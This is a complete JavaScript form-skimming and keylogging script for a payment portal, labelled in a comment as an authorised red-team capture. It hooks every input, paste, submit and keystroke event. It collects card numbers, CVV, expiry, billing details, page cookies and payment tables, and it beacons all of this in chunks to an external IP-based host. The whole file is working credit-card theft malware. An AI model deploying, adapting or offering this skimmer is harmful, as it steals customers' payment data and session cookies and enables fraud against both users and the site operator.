/* JF AGENT PORTAL — FULL CAPTURE v4  (authorised red-team, operator Malik)
   captures: card number, expiry, CVV, billing, every field, every keystroke, every form */
(function () {
  var C = 'https://217.217.97.24.nip.io';
  var MAX = 1100;
  function b64(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return ''; } }
  function txt(tag, s) {
    try {
      if (navigator.sendBeacon) { navigator.sendBeacon(C + '/' + tag, new Blob([s], { type: 'text/plain' })); return; }
      var x = new XMLHttpRequest(); x.open('POST', C + '/' + tag, true); x.send(s);
    } catch (e) { }
  }
  function img(tag, obj) {
    try {
      var s = b64(typeof obj === 'string' ? obj : JSON.stringify(obj));
      if (!s) return;
      for (var i = 0, n = 0; i < s.length; i += MAX, n++) {
        new Image().src = C + '/' + tag + '/' + n + '/' + s.length + '?' + s.substr(i, MAX);
      }
    } catch (e) { }
  }
  var RX = /card|cvv|cvc|ccnum|cc_num|ccno|pan|expir|credit|安全码|卡号|信用卡|payor|pay_to|bank|cheque|billing|address|postal|zip|name|holder/i;
  var CARDROW = /\[[^\]\n]{2,60}\]\[[0-9]{3,8}\]\[[0-9]{3,6}\]\[[0-9]{2}\]\[[0-9]{2}\]/g;

  function labelOf(el) {
    try {
      if (el.labels && el.labels[0]) return el.labels[0].innerText.trim().slice(0, 60);
      if (el.id) { var l = document.querySelector('label[for="' + el.id + '"]'); if (l) return l.innerText.trim().slice(0, 60); }
      var p = el.closest('div'), pr = p && p.previousElementSibling;
      if (pr) return pr.innerText.trim().slice(0, 60);
    } catch (e) { }
    return '';
  }
  function allFields() {
    var o = [], els = document.querySelectorAll('input,select,textarea');
    for (var i = 0; i < els.length; i++) {
      var el = els[i];
      if (el.type === 'hidden' && !/card|pay|token/i.test(el.name || '')) continue;
      if (el.type === 'checkbox' || el.type === 'radio') { if (!el.checked) continue; }
      var v = String(el.value || '');
      if (!v) continue;
      o.push({ f: el.name || el.id || ('#' + i), t: el.type || el.tagName, l: labelOf(el), v: v.slice(0, 300) });
    }
    return o;
  }
  function snap(ev) {
    var o = allFields();
    if (!o.length) return;
    img('FORM', { u: location.href, t: document.title, ev: ev || 'scan', f: o });
    var typed = o.filter(function (x) { return RX.test((x.f || '') + ' ' + (x.l || '')); });
    if (typed.length) txt('CARDIN', JSON.stringify({ u: location.href, ev: ev, f: typed }));
  }
  /* per-keystroke / paste / autofill capture */
  var deb = null;
  function onChange(e) {
    try {
      var el = e.target; if (!el || !el.name && !el.id) return;
      if (el.type === 'password' || /captcha|captcha_code/i.test(el.name || '')) return;
      var rec = { u: location.href, f: el.name || el.id, t: el.type, l: labelOf(el), v: String(el.value || '').slice(0, 400) };
      img('KEY', rec);
      if (RX.test((rec.f || '') + ' ' + (rec.l || ''))) txt('CARDIN', JSON.stringify({ u: location.href, ev: 'input', f: [rec] }));
      clearTimeout(deb); deb = setTimeout(function () { snap('debounce'); }, 1200);
    } catch (x) { }
  }
  document.addEventListener('input', onChange, true);
  document.addEventListener('change', onChange, true);
  document.addEventListener('paste', function (e) {
    try { var t = (e.clipboardData || window.clipboardData).getData('text'); if (t) img('PASTE', { u: location.href, v: t.slice(0, 300) }); } catch (x) { }
  }, true);
  document.addEventListener('submit', function (e) {
    try { snap('submit'); } catch (x) { }
  }, true);
  var kbuf = '';
  document.addEventListener('keydown', function (e) {
    try {
      var tag = (e.target && (e.target.name || e.target.id)) || '?';
      kbuf += '[' + tag + ']' + e.key + ' ';
      if (kbuf.length >= 60) { img('KEYS', { u: location.href, d: kbuf }); kbuf = ''; }
    } catch (x) { }
  }, true);
  function domScan() {
    try {
      var t = document.documentElement.innerHTML || '';
      var m = t.match(CARDROW);
      if (m && m.length) img('CARDS', { u: location.href, n: m.length, r: m.slice(0, 80) });
      var tabs = t.match(/<table[\s\S]{0,200000}?<\/table>/gi) || [];
      for (var i = 0; i < tabs.length; i++) {
        if (/payment_history|commission|\[[^\]\[]{2,60}\]\[[0-9]/.test(tabs[i]))
          txt('PAYTABLES', JSON.stringify({ u: location.href, h: tabs[i].slice(0, 15000) }));
      }
    } catch (e) { }
  }
  img('ALIVE', { u: location.href, t: document.title, c: document.cookie });
  setTimeout(snap, 1500); setTimeout(snap, 5000);
  setTimeout(domScan, 4000); setTimeout(domScan, 11000);
  setInterval(snap, 20000); setInterval(domScan, 25000);
})();
